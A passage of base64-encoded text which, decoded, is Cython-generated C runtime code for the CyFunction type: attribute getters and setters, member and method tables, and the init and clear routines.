pIDwgMCkpIHJldHVybiBOVUxMO1xuICAgICAgICAgICAgcmVzdWx0ID0gb3AtPmRlZmF1bHRzX2t3ZGljdDtcbiAgICAgICAgfSBlbHNlIHtcbiAgICAgICAgICAgIHJlc3VsdCA9IFB5X05vbmU7XG4gICAgICAgIH1cbiAgICB9XG4gICAgUHlfSU5DUkVGKHJlc3VsdCk7XG4gICAgcmV0dXJuIHJlc3VsdDtcbn1cbnN0YXRpYyBQeU9iamVjdCAqXG5fX1B5eF9DeUZ1bmN0aW9uX2dldF9rd2RlZmF1bHRzKF9fcHl4X0N5RnVuY3Rpb25PYmplY3QgKm9wLCB2b2lkICpjb250ZXh0KSB7XG4gICAgUHlPYmplY3QqIHJlc3VsdDtcbiAgICBDWVRIT05fVU5VU0VEX1ZBUihjb250ZXh0KTtcbiAgICBfX1B5eF9CRUdJTl9DUklUSUNBTF9TRUNUSU9OKG9wKTtcbiAgICByZXN1bHQgPSBfX1B5eF9DeUZ1bmN0aW9uX2dldF9rd2RlZmF1bHRzX2xvY2tlZChvcCk7XG4gICAgX19QeXhfRU5EX0NSSVRJQ0FMX1NFQ1RJT04oKTtcbiAgICByZXR1cm4gcmVzdWx0O1xufVxuc3RhdGljIGludFxuX19QeXhfQ3lGdW5jdGlvbl9zZXRfYW5ub3RhdGlvbnMoX19weXhfQ3lGdW5jdGlvbk9iamVjdCAqb3AsIFB5T2JqZWN0KiB2YWx1ZSwgdm9pZCAqY29udGV4dCkge1xuICAgIENZVEhPTl9VTlVTRURfVkFSKGNvbnRleHQpO1xuICAgIGlmICghdmFsdWUgfHwgdmFsdWUgPT0gUHlfTm9uZSkge1xuICAgICAgICB2YWx1ZSA9IE5VTEw7XG4gICAgfSBlbHNlIGlmICh1bmxpa2VseSghUHlEaWN0X0NoZWNrKHZhbHVlKSkpIHtcbiAgICAgICAgUHlFcnJfU2V0U3RyaW5nKFB5RXhjX1R5cGVFcnJvcixcbiAgICAgICAgICAgICAgICAgICAgICAgICJfX2Fubm90YXRpb25zX18gbXVzdCBiZSBzZXQgdG8gYSBkaWN0IG9iamVjdCIpO1xuICAgICAgICByZXR1cm4gLTE7XG4gICAgfVxuICAgIFB5X1hJTkNSRUYodmFsdWUpO1xuICAgIF9fUHl4X0JFR0lOX0NSSVRJQ0FMX1NFQ1RJT04ob3ApO1xuICAgIF9fUHl4X1B5X1hERUNSRUZfU0VUKG9wLT5mdW5jX2Fubm90YXRpb25zLCB2YWx1ZSk7XG4gICAgX19QeXhfRU5EX0NSSVRJQ0FMX1NFQ1RJT04oKTtcbiAgICByZXR1cm4gMDtcbn1cbnN0YXRpYyBQeU9iamVjdCAqXG5fX1B5eF9DeUZ1bmN0aW9uX2dldF9hbm5vdGF0aW9uc19sb2NrZWQoX19weXhfQ3lGdW5jdGlvbk9iamVjdCAqb3ApIHtcbiAgICBQeU9iamVjdCogcmVzdWx0ID0gb3AtPmZ1bmNfYW5ub3RhdGlvbnM7XG4gICAgaWYgKHVubGlrZWx5KCFyZXN1bHQpKSB7XG4gICAgICAgIHJlc3VsdCA9IFB5RGljdF9OZXcoKTtcbiAgICAgICAgaWYgKHVubGlrZWx5KCFyZXN1bHQpKSByZXR1cm4gTlVMTDtcbiAgICAgICAgb3AtPmZ1bmNfYW5ub3RhdGlvbnMgPSByZXN1bHQ7XG4gICAgfVxuICAgIFB5X0lOQ1JFRihyZXN1bHQpO1xuICAgIHJldHVybiByZXN1bHQ7XG59XG5zdGF0aWMgUHlPYmplY3QgKlxuX19QeXhfQ3lGdW5jdGlvbl9nZXRfYW5ub3RhdGlvbnMoX19weXhfQ3lGdW5jdGlvbk9iamVjdCAqb3AsIHZvaWQgKmNvbnRleHQpIHtcbiAgICBQeU9iamVjdCAqcmVzdWx0O1xuICAgIENZVEhPTl9VTlVTRURfVkFSKGNvbnRleHQpO1xuICAgIF9fUHl4X0JFR0lOX0NSSVRJQ0FMX1NFQ1RJT04ob3ApO1xuICAgIHJlc3VsdCA9IF9fUHl4X0N5RnVuY3Rpb25fZ2V0X2Fubm90YXRpb25zX2xvY2tlZChvcCk7XG4gICAgX19QeXhfRU5EX0NSSVRJQ0FMX1NFQ1RJT04oKTtcbiAgICByZXR1cm4gcmVzdWx0O1xufVxuc3RhdGljIFB5T2JqZWN0ICpcbl9fUHl4X0N5RnVuY3Rpb25fZ2V0X2lzX2Nvcm91dGluZV92YWx1ZShfX3B5eF9DeUZ1bmN0aW9uT2JqZWN0ICpvcCkge1xuICAgIGludCBpc19jb3JvdXRpbmUgPSBvcC0+ZmxhZ3MgJiBfX1B5eF9DWUZVTkNUSU9OX0NPUk9VVElORTtcbiAgICBpZiAoaXNfY29yb3V0aW5lKSB7XG4gICAgICAgIFB5T2JqZWN0ICppc19jb3JvdXRpbmVfdmFsdWUsICptb2R1bGUsICpmcm9tbGlzdCwgKm1hcmtlciA9IF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9pc19jb3JvdXRpbmU7XG4gICAgICAgIGZyb21saXN0ID0gUHlMaXN0X05ldygxKTtcbiAgICAgICAgaWYgKHVubGlrZWx5KCFmcm9tbGlzdCkpIHJldHVybiBOVUxMO1xuICAgICAgICBQeV9JTkNSRUYobWFya2VyKTtcbiNpZiBDWVRIT05fQVNTVU1FX1NBRkVfTUFDUk9TXG4gICAgICAgIFB5TGlzdF9TRVRfSVRFTShmcm9tbGlzdCwgMCwgbWFya2VyKTtcbiNlbHNlXG4gICAgICAgIGlmICh1bmxpa2VseShQeUxpc3RfU2V0SXRlbShmcm9tbGlzdCwgMCwgbWFya2VyKSA8IDApKSB7XG4gICAgICAgICAgICBQeV9ERUNSRUYobWFya2VyKTtcbiAgICAgICAgICAgIFB5X0RFQ1JFRihmcm9tbGlzdCk7XG4gICAgICAgICAgICByZXR1cm4gTlVMTDtcbiAgICAgICAgfVxuI2VuZGlmXG4gICAgICAgIG1vZHVsZSA9IFB5SW1wb3J0X0ltcG9ydE1vZHVsZUxldmVsT2JqZWN0KF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9hc3luY2lvX2Nvcm91dGluZXMsIE5VTEwsIE5VTEwsIGZyb21saXN0LCAwKTtcbiAgICAgICAgUHlfREVDUkVGKGZyb21saXN0KTtcbiAgICAgICAgaWYgKHVubGlrZWx5KCFtb2R1bGUpKSBnb3RvIGlnbm9yZTtcbiAgICAgICAgaXNfY29yb3V0aW5lX3ZhbHVlID0gX19QeXhfUHlPYmplY3RfR2V0QXR0clN0cihtb2R1bGUsIG1hcmtlcik7XG4gICAgICAgIFB5X0RFQ1JFRihtb2R1bGUpO1xuICAgICAgICBpZiAobGlrZWx5KGlzX2Nvcm91dGluZV92YWx1ZSkpIHtcbiAgICAgICAgICAgIHJldHVybiBpc19jb3JvdXRpbmVfdmFsdWU7XG4gICAgICAgIH1cbmlnbm9yZTpcbiAgICAgICAgUHlFcnJfQ2xlYXIoKTtcbiAgICB9XG4gICAgcmV0dXJuIF9fUHl4X1B5Qm9vbF9Gcm9tTG9uZyhpc19jb3JvdXRpbmUpO1xufVxuc3RhdGljIFB5T2JqZWN0ICpcbl9fUHl4X0N5RnVuY3Rpb25fZ2V0X2lzX2Nvcm91dGluZShfX3B5eF9DeUZ1bmN0aW9uT2JqZWN0ICpvcCwgdm9pZCAqY29udGV4dCkge1xuICAgIFB5T2JqZWN0ICpyZXN1bHQ7XG4gICAgQ1lUSE9OX1VOVVNFRF9WQVIoY29udGV4dCk7XG4gICAgaWYgKG9wLT5mdW5jX2lzX2Nvcm91dGluZSkge1xuICAgICAgICByZXR1cm4gX19QeXhfTmV3UmVmKG9wLT5mdW5jX2lzX2Nvcm91dGluZSk7XG4gICAgfVxuICAgIHJlc3VsdCA9IF9fUHl4X0N5RnVuY3Rpb25fZ2V0X2lzX2Nvcm91dGluZV92YWx1ZShvcCk7XG4gICAgaWYgKHVubGlrZWx5KCFyZXN1bHQpKVxuICAgICAgICByZXR1cm4gTlVMTDtcbiAgICBfX1B5eF9CRUdJTl9DUklUSUNBTF9TRUNUSU9OKG9wKTtcbiAgICBpZiAob3AtPmZ1bmNfaXNfY29yb3V0aW5lKSB7XG4gICAgICAgIFB5X0RFQ1JFRihyZXN1bHQpO1xuICAgICAgICByZXN1bHQgPSBfX1B5eF9OZXdSZWYob3AtPmZ1bmNfaXNfY29yb3V0aW5lKTtcbiAgICB9IGVsc2Uge1xuICAgICAgICBvcC0+ZnVuY19pc19jb3JvdXRpbmUgPSBfX1B5eF9OZXdSZWYocmVzdWx0KTtcbiAgICB9XG4gICAgX19QeXhfRU5EX0NSSVRJQ0FMX1NFQ1RJT04oKTtcbiAgICByZXR1cm4gcmVzdWx0O1xufVxuc3RhdGljIHZvaWQgX19QeXhfQ3lGdW5jdGlvbl9yYWlzZV9hcmd1bWVudF9jb3VudF9lcnJvcihfX3B5eF9DeUZ1bmN0aW9uT2JqZWN0ICpmdW5jLCBjb25zdCBjaGFyKiBtZXNzYWdlLCBQeV9zc2l6ZV90IHNpemUpIHtcbiNpZiBDWVRIT05fQ09NUElMSU5HX0lOX0xJTUlURURfQVBJXG4gICAgUHlPYmplY3QgKnB5X25hbWUgPSBfX1B5eF9DeUZ1bmN0aW9uX2dldF9uYW1lKGZ1bmMsIE5VTEwpO1xuICAgIGlmICghcHlfbmFtZSkgcmV0dXJuO1xuICAgIFB5RXJyX0Zvcm1hdChQeUV4Y19UeXBlRXJyb3IsXG4gICAgICAgICIlLjIwMFMoKSAlcyAoJSIgQ1lUSE9OX0ZPUk1BVF9TU0laRV9UICJkIGdpdmVuKSIsXG4gICAgICAgIHB5X25hbWUsIG1lc3NhZ2UsIHNpemUpO1xuICAgIFB5X0RFQ1JFRihweV9uYW1lKTtcbiNlbHNlXG4gICAgY29uc3QgY2hhciogbmFtZSA9ICgoUHlDRnVuY3Rpb25PYmplY3QqKWZ1bmMpLT5tX21sLT5tbF9uYW1lO1xuICAgIFB5RXJyX0Zvcm1hdChQeUV4Y19UeXBlRXJyb3IsXG4gICAgICAgICIlLjIwMHMoKSAlcyAoJSIgQ1lUSE9OX0ZPUk1BVF9TU0laRV9UICJkIGdpdmVuKSIsXG4gICAgICAgIG5hbWUsIG1lc3NhZ2UsIHNpemUpO1xuI2VuZGlmXG59XG5zdGF0aWMgdm9pZCBfX1B5eF9DeUZ1bmN0aW9uX3JhaXNlX3R5cGVfZXJyb3IoX19weXhfQ3lGdW5jdGlvbk9iamVjdCAqZnVuYywgY29uc3QgY2hhciogbWVzc2FnZSkge1xuI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fTElNSVRFRF9BUElcbiAgICBQeU9iamVjdCAqcHlfbmFtZSA9IF9fUHl4X0N5RnVuY3Rpb25fZ2V0X25hbWUoZnVuYywgTlVMTCk7XG4gICAgaWYgKCFweV9uYW1lKSByZXR1cm47XG4gICAgUHlFcnJfRm9ybWF0KFB5RXhjX1R5cGVFcnJvcixcbiAgICAgICAgIiUuMjAwUygpICVzIixcbiAgICAgICAgcHlfbmFtZSwgbWVzc2FnZSk7XG4gICAgUHlfREVDUkVGKHB5X25hbWUpO1xuI2Vsc2VcbiAgICBjb25zdCBjaGFyKiBuYW1lID0gKChQeUNGdW5jdGlvbk9iamVjdCopZnVuYyktPm1fbWwtPm1sX25hbWU7XG4gICAgUHlFcnJfRm9ybWF0KFB5RXhjX1R5cGVFcnJvcixcbiAgICAgICAgIiUuMjAwcygpICVzIixcbiAgICAgICAgbmFtZSwgbWVzc2FnZSk7XG4jZW5kaWZcbn1cbiNpZiBDWVRIT05fQ09NUElMSU5HX0lOX0xJTUlURURfQVBJXG5zdGF0aWMgUHlPYmplY3QgKlxuX19QeXhfQ3lGdW5jdGlvbl9nZXRfbW9kdWxlKF9fcHl4X0N5RnVuY3Rpb25PYmplY3QgKm9wLCB2b2lkICpjb250ZXh0KSB7XG4gICAgQ1lUSE9OX1VOVVNFRF9WQVIoY29udGV4dCk7XG4gICAgcmV0dXJuIFB5T2JqZWN0X0dldEF0dHJTdHJpbmcob3AtPmZ1bmMsICJfX21vZHVsZV9fIik7XG59XG5zdGF0aWMgaW50XG5fX1B5eF9DeUZ1bmN0aW9uX3NldF9tb2R1bGUoX19weXhfQ3lGdW5jdGlvbk9iamVjdCAqb3AsIFB5T2JqZWN0KiB2YWx1ZSwgdm9pZCAqY29udGV4dCkge1xuICAgIENZVEhPTl9VTlVTRURfVkFSKGNvbnRleHQpO1xuICAgIHJldHVybiBQeU9iamVjdF9TZXRBdHRyU3RyaW5nKG9wLT5mdW5jLCAiX19tb2R1bGVfXyIsIHZhbHVlKTtcbn1cbiNlbmRpZlxuc3RhdGljIFB5R2V0U2V0RGVmIF9fcHl4X0N5RnVuY3Rpb25fZ2V0c2V0c1tdID0ge1xuICAgIHsiZnVuY19kb2MiLCAoZ2V0dGVyKV9fUHl4X0N5RnVuY3Rpb25fZ2V0X2RvYywgKHNldHRlcilfX1B5eF9DeUZ1bmN0aW9uX3NldF9kb2MsIDAsIDB9LFxuICAgIHsiX19kb2NfXyIsICAoZ2V0dGVyKV9fUHl4X0N5RnVuY3Rpb25fZ2V0X2RvYywgKHNldHRlcilfX1B5eF9DeUZ1bmN0aW9uX3NldF9kb2MsIDAsIDB9LFxuICAgIHsiZnVuY19uYW1lIiwgKGdldHRlcilfX1B5eF9DeUZ1bmN0aW9uX2dldF9uYW1lLCAoc2V0dGVyKV9fUHl4X0N5RnVuY3Rpb25fc2V0X25hbWUsIDAsIDB9LFxuICAgIHsiX19uYW1lX18iLCAoZ2V0dGVyKV9fUHl4X0N5RnVuY3Rpb25fZ2V0X25hbWUsIChzZXR0ZXIpX19QeXhfQ3lGdW5jdGlvbl9zZXRfbmFtZSwgMCwgMH0sXG4gICAgeyJfX3F1YWxuYW1lX18iLCAoZ2V0dGVyKV9fUHl4X0N5RnVuY3Rpb25fZ2V0X3F1YWxuYW1lLCAoc2V0dGVyKV9fUHl4X0N5RnVuY3Rpb25fc2V0X3F1YWxuYW1lLCAwLCAwfSxcbiAgICB7ImZ1bmNfZGljdCIsIChnZXR0ZXIpX19QeXhfQ3lGdW5jdGlvbl9nZXRfZGljdCwgKHNldHRlcilfX1B5eF9DeUZ1bmN0aW9uX3NldF9kaWN0LCAwLCAwfSxcbiAgICB7Il9fZGljdF9fIiwgKGdldHRlcilfX1B5eF9DeUZ1bmN0aW9uX2dldF9kaWN0LCAoc2V0dGVyKV9fUHl4X0N5RnVuY3Rpb25fc2V0X2RpY3QsIDAsIDB9LFxuICAgIHsiZnVuY19nbG9iYWxzIiwgKGdldHRlcilfX1B5eF9DeUZ1bmN0aW9uX2dldF9nbG9iYWxzLCAwLCAwLCAwfSxcbiAgICB7Il9fZ2xvYmFsc19fIiwgKGdldHRlcilfX1B5eF9DeUZ1bmN0aW9uX2dldF9nbG9iYWxzLCAwLCAwLCAwfSxcbiAgICB7ImZ1bmNfY2xvc3VyZSIsIChnZXR0ZXIpX19QeXhfQ3lGdW5jdGlvbl9nZXRfY2xvc3VyZSwgMCwgMCwgMH0sXG4gICAgeyJfX2Nsb3N1cmVfXyIsIChnZXR0ZXIpX19QeXhfQ3lGdW5jdGlvbl9nZXRfY2xvc3VyZSwgMCwgMCwgMH0sXG4gICAgeyJmdW5jX2NvZGUiLCAoZ2V0dGVyKV9fUHl4X0N5RnVuY3Rpb25fZ2V0X2NvZGUsIDAsIDAsIDB9LFxuICAgIHsiX19jb2RlX18iLCAoZ2V0dGVyKV9fUHl4X0N5RnVuY3Rpb25fZ2V0X2NvZGUsIDAsIDAsIDB9LFxuICAgIHsiZnVuY19kZWZhdWx0cyIsIChnZXR0ZXIpX19QeXhfQ3lGdW5jdGlvbl9nZXRfZGVmYXVsdHMsIChzZXR0ZXIpX19QeXhfQ3lGdW5jdGlvbl9zZXRfZGVmYXVsdHMsIDAsIDB9LFxuICAgIHsiX19kZWZhdWx0c19fIiwgKGdldHRlcilfX1B5eF9DeUZ1bmN0aW9uX2dldF9kZWZhdWx0cywgKHNldHRlcilfX1B5eF9DeUZ1bmN0aW9uX3NldF9kZWZhdWx0cywgMCwgMH0sXG4gICAgeyJfX2t3ZGVmYXVsdHNfXyIsIChnZXR0ZXIpX19QeXhfQ3lGdW5jdGlvbl9nZXRfa3dkZWZhdWx0cywgKHNldHRlcilfX1B5eF9DeUZ1bmN0aW9uX3NldF9rd2RlZmF1bHRzLCAwLCAwfSxcbiAgICB7Il9fYW5ub3RhdGlvbnNfXyIsIChnZXR0ZXIpX19QeXhfQ3lGdW5jdGlvbl9nZXRfYW5ub3RhdGlvbnMsIChzZXR0ZXIpX19QeXhfQ3lGdW5jdGlvbl9zZXRfYW5ub3RhdGlvbnMsIDAsIDB9LFxuICAgIHsiX2lzX2Nvcm91dGluZSIsIChnZXR0ZXIpX19QeXhfQ3lGdW5jdGlvbl9nZXRfaXNfY29yb3V0aW5lLCAwLCAwLCAwfSxcbiNpZiBDWVRIT05fQ09NUElMSU5HX0lOX0xJTUlURURfQVBJXG4gICAgeyJfX21vZHVsZV9fIiwgKGdldHRlcilfX1B5eF9DeUZ1bmN0aW9uX2dldF9tb2R1bGUsIChzZXR0ZXIpX19QeXhfQ3lGdW5jdGlvbl9zZXRfbW9kdWxlLCAwLCAwfSxcbiNlbmRpZlxuICAgIHswLCAwLCAwLCAwLCAwfVxufTtcbnN0YXRpYyBQeU1lbWJlckRlZiBfX3B5eF9DeUZ1bmN0aW9uX21lbWJlcnNbXSA9IHtcbiNpZiAhQ1lUSE9OX0NPTVBJTElOR19JTl9MSU1JVEVEX0FQSVxuICAgIHsiX19tb2R1bGVfXyIsIFRfT0JKRUNULCBvZmZzZXRvZihQeUNGdW5jdGlvbk9iamVjdCwgbV9tb2R1bGUpLCAwLCAwfSxcbiNlbmRpZlxuICAgIHsiX19kaWN0b2Zmc2V0X18iLCBUX1BZU1NJWkVULCBvZmZzZXRvZihfX3B5eF9DeUZ1bmN0aW9uT2JqZWN0LCBmdW5jX2RpY3QpLCBSRUFET05MWSwgMH0sXG4jaWYgQ1lUSE9OX01FVEhfRkFTVENBTExcbiNpZiBDWVRIT05fQkFDS1BPUlRfVkVDVE9SQ0FMTCB8fCBDWVRIT05fQ09NUElMSU5HX0lOX0xJTUlURURfQVBJXG4gICAgeyJfX3ZlY3RvcmNhbGxvZmZzZXRfXyIsIFRfUFlTU0laRVQsIG9mZnNldG9mKF9fcHl4X0N5RnVuY3Rpb25PYmplY3QsIGZ1bmNfdmVjdG9yY2FsbCksIFJFQURPTkxZLCAwfSxcbiNlbHNlXG4gICAgeyJfX3ZlY3RvcmNhbGxvZmZzZXRfXyIsIFRfUFlTU0laRVQsIG9mZnNldG9mKFB5Q0Z1bmN0aW9uT2JqZWN0LCB2ZWN0b3JjYWxsKSwgUkVBRE9OTFksIDB9LFxuI2VuZGlmXG4jaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9MSU1JVEVEX0FQSVxuICAgIHsiX193ZWFrbGlzdG9mZnNldF9fIiwgVF9QWVNTSVpFVCwgb2Zmc2V0b2YoX19weXhfQ3lGdW5jdGlvbk9iamVjdCwgZnVuY193ZWFrcmVmbGlzdCksIFJFQURPTkxZLCAwfSxcbiNlbHNlXG4gICAgeyJfX3dlYWtsaXN0b2Zmc2V0X18iLCBUX1BZU1NJWkVULCBvZmZzZXRvZihQeUNGdW5jdGlvbk9iamVjdCwgbV93ZWFrcmVmbGlzdCksIFJFQURPTkxZLCAwfSxcbiNlbmRpZlxuI2VuZGlmXG4gICAgezAsIDAsIDAsICAwLCAwfVxufTtcbnN0YXRpYyBQeU9iamVjdCAqXG5fX1B5eF9DeUZ1bmN0aW9uX3JlZHVjZShfX3B5eF9DeUZ1bmN0aW9uT2JqZWN0ICptLCBQeU9iamVjdCAqYXJncylcbntcbiAgICBQeU9iamVjdCAqcmVzdWx0ID0gTlVMTDtcbiAgICBDWVRIT05fVU5VU0VEX1ZBUihhcmdzKTtcbiAgICBfX1B5eF9CRUdJTl9DUklUSUNBTF9TRUNUSU9OKG0pO1xuICAgIFB5X0lOQ1JFRihtLT5mdW5jX3F1YWxuYW1lKTtcbiAgICByZXN1bHQgPSBtLT5mdW5jX3F1YWxuYW1lO1xuICAgIF9fUHl4X0VORF9DUklUSUNBTF9TRUNUSU9OKCk7XG4gICAgcmV0dXJuIHJlc3VsdDtcbn1cbnN0YXRpYyBQeU1ldGhvZERlZiBfX3B5eF9DeUZ1bmN0aW9uX21ldGhvZHNbXSA9IHtcbiAgICB7Il9fcmVkdWNlX18iLCAoUHlDRnVuY3Rpb24pX19QeXhfQ3lGdW5jdGlvbl9yZWR1Y2UsIE1FVEhfVkFSQVJHUywgMH0sXG4gICAgezAsIDAsIDAsIDB9XG59O1xuI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fTElNSVRFRF9BUElcbiNkZWZpbmUgX19QeXhfQ3lGdW5jdGlvbl93ZWFrcmVmbGlzdChjeWZ1bmMpICgoY3lmdW5jKS0+ZnVuY193ZWFrcmVmbGlzdClcbiNlbHNlXG4jZGVmaW5lIF9fUHl4X0N5RnVuY3Rpb25fd2Vha3JlZmxpc3QoY3lmdW5jKSAoKChQeUNGdW5jdGlvbk9iamVjdCopY3lmdW5jKS0+bV93ZWFrcmVmbGlzdClcbiNlbmRpZlxuc3RhdGljIFB5T2JqZWN0ICpfX1B5eF9DeUZ1bmN0aW9uX0luaXQoX19weXhfQ3lGdW5jdGlvbk9iamVjdCAqb3AsIFB5TWV0aG9kRGVmICptbCwgaW50IGZsYWdzLCBQeU9iamVjdCogcXVhbG5hbWUsXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBQeU9iamVjdCAqY2xvc3VyZSwgUHlPYmplY3QgKm1vZHVsZSwgUHlPYmplY3QqIGdsb2JhbHMsIFB5T2JqZWN0KiBjb2RlKSB7XG4jaWYgIUNZVEhPTl9DT01QSUxJTkdfSU5fTElNSVRFRF9BUElcbiAgICBQeUNGdW5jdGlvbk9iamVjdCAqY2YgPSAoUHlDRnVuY3Rpb25PYmplY3QqKSBvcDtcbiNlbmRpZlxuICAgIGlmICh1bmxpa2VseShvcCA9PSBOVUxMKSlcbiAgICAgICAgcmV0dXJuIE5VTEw7XG4jaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9MSU1JVEVEX0FQSVxuICAgIG9wLT5mdW5jID0gUHlDRnVuY3Rpb25fTmV3RXgobWwsIChQeU9iamVjdCopb3AsIG1vZHVsZSk7XG4gICAgaWYgKHVubGlrZWx5KCFvcC0+ZnVuYykpIHJldHVybiBOVUxMO1xuI2VuZGlmXG4gICAgb3AtPmZsYWdzID0gZmxhZ3M7XG4gICAgX19QeXhfQ3lGdW5jdGlvbl93ZWFrcmVmbGlzdChvcCkgPSBOVUxMO1xuI2lmICFDWVRIT05fQ09NUElMSU5HX0lOX0xJTUlURURfQVBJXG4gICAgY2YtPm1fbWwgPSBtbDtcbiAgICBjZi0+bV9zZWxmID0gKFB5T2JqZWN0ICopIG9wO1xuI2VuZGlmXG4gICAgUHlfWElOQ1JFRihjbG9zdXJlKTtcbiAgICBvcC0+ZnVuY19jbG9zdXJlID0gY2xvc3VyZTtcbiNpZiAhQ1lUSE9OX0NPTVBJTElOR19JTl9MSU1JVEVEX0FQSVxuICAgIFB5X1hJTkNSRUYobW9kdWxlKTtcbiAgICBjZi0+bV9tb2R1bGUgPSBtb2R1bGU7XG4jZW5kaWZcbiAgICBvcC0+ZnVuY19kaWN0ID0gTlVMTDtcbiAgICBvcC0+ZnVuY19uYW1lID0gTlVMTDtcbiAgICBQeV9JTkNSRUYocXVhbG5hbWUpO1xuICAgIG9wLT5mdW5jX3F1YWxuYW1lID0gcXVhbG5hbWU7XG4gICAgb3AtPmZ1bmNfZG9jID0gTlVMTDtcbiNpZiBQWV9WRVJTSU9OX0hFWCA8IDB4MDMwOTAwQjEgfHwgQ1lUSE9OX0NPTVBJTElOR19JTl9MSU1JVEVEX0FQSVxuICAgIG9wLT5mdW5jX2NsYXNzb2JqID0gTlVMTDtcbiNlbHNlXG4gICAgKChQeUNNZXRob2RPYmplY3QqKW9wKS0+bW1fY2xhc3MgPSBOVUxMO1xuI2VuZGlmXG4gICAgb3AtPmZ1bmNfZ2xvYmFscyA9IGdsb2JhbHM7XG4gICAgUHlfSU5DUkVGKG9wLT5mdW5jX2dsb2JhbHMpO1xuICAgIFB5X1hJTkNSRUYoY29kZSk7XG4gICAgb3AtPmZ1bmNfY29kZSA9IGNvZGU7XG4gICAgb3AtPmRlZmF1bHRzID0gTlVMTDtcbiAgICBvcC0+ZGVmYXVsdHNfdHVwbGUgPSBOVUxMO1xuICAgIG9wLT5kZWZhdWx0c19rd2RpY3QgPSBOVUxMO1xuICAgIG9wLT5kZWZhdWx0c19nZXR0ZXIgPSBOVUxMO1xuICAgIG9wLT5mdW5jX2Fubm90YXRpb25zID0gTlVMTDtcbiAgICBvcC0+ZnVuY19pc19jb3JvdXRpbmUgPSBOVUxMO1xuI2lmIENZVEhPTl9NRVRIX0ZBU1RDQUxMXG4gICAgc3dpdGNoIChtbC0+bWxfZmxhZ3MgJiAoTUVUSF9WQVJBUkdTIHwgTUVUSF9GQVNUQ0FMTCB8IE1FVEhfTk9BUkdTIHwgTUVUSF9PIHwgTUVUSF9LRVlXT1JEUyB8IE1FVEhfTUVUSE9EKSkge1xuICAgIGNhc2UgTUVUSF9OT0FSR1M6XG4gICAgICAgIF9fUHl4X0N5RnVuY3Rpb25fZnVuY192ZWN0b3JjYWxsKG9wKSA9IF9fUHl4X0N5RnVuY3Rpb25fVmVjdG9yY2FsbF9OT0FSR1M7XG4gICAgICAgIGJyZWFrO1xuICAgIGNhc2UgTUVUSF9POlxuICAgICAgICBfX1B5eF9DeUZ1bmN0aW9uX2Z1bmNfdmVjdG9yY2FsbChvcCkgPSBfX1B5eF9DeUZ1bmN0aW9uX1ZlY3RvcmNhbGxfTztcbiAgICAgICAgYnJlYWs7XG4gICAgY2FzZSBNRVRIX01FVEhPRCB8IE1FVEhfRkFTVENBTEwgfCBNRVRIX0tFWVdPUkRTOlxuICAgICAgICBfX1B5eF9DeUZ1bmN0aW9uX2Z1bmNfdmVjdG9yY2FsbChvcCkgPSBfX1B5eF9DeUZ1bmN0aW9uX1ZlY3RvcmNhbGxfRkFTVENBTExfS0VZV09SRFNfTUVUSE9EO1xuICAgICAgICBicmVhaztcbiAgICBjYXNlIE1FVEhfRkFTVENBTEwgfCBNRVRIX0tFWVdPUkRTOlxuICAgICAgICBfX1B5eF9DeUZ1bmN0aW9uX2Z1bmNfdmVjdG9yY2FsbChvcCkgPSBfX1B5eF9DeUZ1bmN0aW9uX1ZlY3RvcmNhbGxfRkFTVENBTExfS0VZV09SRFM7XG4gICAgICAgIGJyZWFrO1xuICAgIGNhc2UgTUVUSF9WQVJBUkdTIHwgTUVUSF9LRVlXT1JEUzpcbiAgICAgICAgX19QeXhfQ3lGdW5jdGlvbl9mdW5jX3ZlY3RvcmNhbGwob3ApID0gTlVMTDtcbiAgICAgICAgYnJlYWs7XG4gICAgZGVmYXVsdDpcbiAgICAgICAgUHlFcnJfU2V0U3RyaW5nKFB5RXhjX1N5c3RlbUVycm9yLCAiQmFkIGNhbGwgZmxhZ3MgZm9yIEN5RnVuY3Rpb24iKTtcbiAgICAgICAgUHlfREVDUkVGKG9wKTtcbiAgICAgICAgcmV0dXJuIE5VTEw7XG4gICAgfVxuI2VuZGlmXG4gICAgcmV0dXJuIChQeU9iamVjdCAqKSBvcDtcbn1cbnN0YXRpYyBpbnRcbl9fUHl4X0N5RnVuY3Rpb25fY2xlYXIoX19weXhfQ3lGdW5jdGlvbk9iamVjdCAqbSlcbntcbiAgICBQeV9DTEVBUihtLT5mdW5jX2Nsb3N1cmUpO1xuI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fTElNSVRFRF9BUElcbiAgICBQeV9DTEVBUihtLT5mdW5jKTtcbiNlbHNlXG4gICAgUHlfQ0xFQVIoKChQeUNGdW5jdGlvbk9iamVjdCopbSktPm1fbW9kdWxlKTtcbiNlbmRpZlxuICAgIFB5X0NMRUFSKG0tPmZ1bmNfZGljdCk7XG4gICAgUHlfQ0xFQVIobS0+ZnVuY19uYW1lKTtcbiAgICBQeV9DTEVBUihtLT5mdW5jX3F1YWxuYW1lKTtcbiAgICBQeV9DTEVBUihtLT5mdW5jX2RvYyk7XG4gICAgUHlfQ0xFQVIobS0+ZnVuY19nbG9iYWxzKTtcbiAgICBQeV9DTEVBUihtLT5mdW5jX2NvZGUpO1xuI2lmICFDWVRIT05fQ09NUElMSU5HX0lOX0xJTUlURURfQVBJXG4jaWYgUFlfVkVSU0lPTl9IRVggPCAweDAzMDkwMEIxXG4gICAgUHlfQ0xFQVIoX19QeXhfQ3lGdW5jdGlvbl9HZXRDbGFzc09iaihtKSk7XG4jZWxzZVxuICAgIHtcbiAgICAgICAgUHlPYmplY3QgKmNscyA9IChQeU9iamVjdCopICgoUHlDTWV0aG9kT2JqZWN0ICopIChtKSktPm1tX2NsYXNzO1xuICAgICAgICAoKFB5Q01ldGhvZE9iamVjdCAqKSAobSkpLT5tbV9jbGFzcyA9IE5VTEw7XG4gICAgICAgIFB5X1hERUNSRUYoY2xzKTtcbiAgICB9XG4jZW5kaWZcbiNlbmRpZlxuICAgIFB5X0NMRUFSKG0tPmRlZmF1bHRzX3R1cGxlKTtcbiAgICBQeV9DTEVBUihtLT5kZWZhdWx0c19rd2RpY3QpO1xuICAgIFB5X0NMRUFSKG0tPmZ1bmNfYW5ub3RhdGlvbnMpO1xuICAgIFB5X0NMRUFSKG0tPmZ1bmNfaXNfY29yb3V0aW5lKTtcbiAgICBQeV9DTEVBUihtLT5kZWZhd